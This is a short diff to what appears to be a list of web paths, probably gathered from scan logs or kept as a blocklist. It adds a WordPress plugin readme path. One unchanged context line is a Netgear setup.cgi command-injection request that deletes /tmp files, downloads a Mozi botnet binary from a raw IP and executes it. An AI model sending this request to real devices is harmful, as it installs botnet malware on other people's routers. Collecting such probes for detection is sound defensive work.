@@ -4152,3 +4152,4 @@ www.liveinternet.ru:443
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.117.30.240:46272/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /global-protect/login.esp
 /index.php/wp-admin/
+/wp-content/plugins/json-api-user/readme.txt
